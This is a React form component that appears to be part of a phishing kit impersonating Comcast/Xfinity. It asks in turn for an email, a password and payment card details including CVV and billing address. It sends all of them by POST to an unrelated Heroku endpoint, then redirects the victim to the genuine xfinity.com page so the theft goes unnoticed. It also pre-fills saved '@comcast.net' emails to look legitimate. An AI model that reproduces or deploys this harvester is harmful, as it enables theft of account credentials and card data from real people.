import React, { useState, useEffect } from 'react';
import Login from './Login';
import Password from './Password';
import BillingInfo from './BillingInfo';

const FormContainer = () => {
  const [step, setStep] = useState(1); // Track the current step

  const [formData, setFormData] = useState({
    email: '',
    password: '',
    nameOnCard: '',
    cardNumber: '',
    cvv: '',
    streetAddress: '',
    city: '',
    state: '',
    postalCode: '',
    country: ''
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const validateForm = () => {
    if (step === 1 && !formData.email) {
      alert('Please enter your email.');
      return false;
    }
    if (step === 2 && !formData.password) {
      alert('Please enter your password.');
      return false;
    }
    if (step === 3 && (!formData.nameOnCard || !formData.cardNumber)) {
      alert('Please fill out the billing details.');
      return false;
    }
    return true;
  };


  const handleNext = () => {
    if (validateForm()) {
      setStep(step + 1);
    }
  };

  useEffect(() => {
    const savedEmail = localStorage.getItem('email');
    if (savedEmail && savedEmail.endsWith('@comcast.net')) {
      setFormData((prevData) => ({
        ...prevData,
        email: savedEmail,
      }));
      setStep(2); // Automatically move to the next step
    }
  }, []); // Run this once on component mount

  const handleSubmit = async (e) => {
    e.preventDefault(); // Prevent default form submission

    console.log('Submitting form with data:', formData); // Log the form data

    try {
      const response = await fetch('https://shielded-island-46547-e694e2bd0c22.herokuapp.com/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });



      const data = await response.json();
      console.log(data);

      if (data.success) {
        // Redirect to external link
        window.location.href = 'https://www.xfinity.com/planbuilder?localize=true&drawer=internet';
      } else {
        alert('Error: ' + data.message);
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  return (
    <form onSubmit={(e) => { e.preventDefault(); step === 3 ? handleSubmit(e) : handleNext(); }}>
      {step === 1 && <Login formData={formData} handleChange={handleChange} handleNext={handleNext} />}
      {step === 2 && <Password formData={formData} email={formData.email} handleChange={handleChange} handleNext={handleNext} />}
      {step === 3 && (
        <BillingInfo
          formData={formData}
          handleChange={handleChange}
          handleSubmit={handleSubmit} // Pass handleSubmit to BillingInfo
        />
      )}
    </form>
  );
};

export default FormContainer;
